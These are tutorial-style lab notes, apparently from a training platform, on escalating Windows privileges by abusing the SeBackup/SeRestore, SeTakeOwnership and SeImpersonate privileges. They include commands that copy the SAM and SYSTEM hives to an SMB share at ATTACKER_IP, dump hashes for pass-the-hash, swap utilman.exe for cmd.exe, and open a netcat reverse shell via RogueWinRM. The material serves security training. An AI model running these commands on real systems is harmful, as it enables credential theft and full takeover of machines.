Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
# Using SeBackup and SeRestore Privileges to Dump Password Hashes

We can Dump sensitive data (like SAM and SYSTEM registry hives) to extract password hashes then perform pass-the-hash to login.

Suppose we have an account with SeBackup and SeRestore Privileges, we start by saving the following registry hives

```
reg save hklm\system <location>
reg save hklm\sam <location>
```

Now we can copy files to our machine, using smb, we need to open a public share on our machine:

```bash
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username <username> -password <password> public share
```

Then, we transfer files to our public share using the following commands:

```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Now, we need to extract password hashes using the following command:

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Finally, we try to perform a Pass-the-Hash attack to access the target machine with SYSTEM privileges:

```bash
python3.9 /opt/impacket/examples/psexec.py -hashes <hash> administrator@<target-ip>
```

# Using SeTakeOwnership to Replace utilman.exe with cmd.exe

The SeTakeOwnership privilege allows you to take ownership of any file, enabling actions like replacing system executables with malicious payloads.

Suppose we have an account with SeTakeOwnership Privilege, we simply takedown the ownership of utilman.exe:

```
takeown /f C:\Windows\System32\Utilman.exe
```

Now we give full permissions to our stolen exe:

```
icacls C:\Windows\System32\Utilman.exe /grant <username>:F
```

Finally, we replace utilman.exe with cmd.exe

```
copy cmd.exe utilman.exe
```

 After this step we can simply lock the screen and click Ease of Access to get cmd.exe with SYSTEM privileges.

# Using SeImpersonate / SeAssignPrimaryToken with RogueWinRM Exploit

The SeImpersonate and SeAssignPrimaryToken privileges allow a process to impersonate other users, enabling SYSTEM-level access via exploitation tools like RogueWinRM.

Assume we access to an IIS web shell on `http://TARGET_IP/`, and this account holds the `SeImpersonate` privilege.

First, let's start a listener on 4442:

```bash
nc -lvp 4442
```

Next we try to upload RogueWinRM Exploit to the target system.

Now, from the web shell, we run the following command to trigger the RogueWinRM exploit.

```
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

### Exploit Workflow

When the **BITS** service starts (which can be triggered by any user), it automatically makes a connection to port **5985** (the default WinRM port).

Normally, **BITS** runs under **SYSTEM** privileges, which means it can access and manage system-level resources.

If WinRM is not already running on port **5985**, an attacker can start a **RogueWinRM** service (a fake WinRM service) on the same port, this rogue service will listen for incoming connections on port **5985** and respond as if it were the legitimate WinRM service.

The **BITS** service connects to the attacker’s rogue WinRM service on port **5985** (just like it would connect to a legitimate WinRM service) and **BITS** attempts to authenticate to this rogue service with **SYSTEM** privileges, as that's the account under which it is running.

When the attacker’s rogue WinRM service receives the connection from the BITS service, it can now leverage the **SeImpersonate** privilege if the attacker has it.

Using **SeImpersonate**, the attacker can impersonate the **SYSTEM** account (the account under which BITS is running).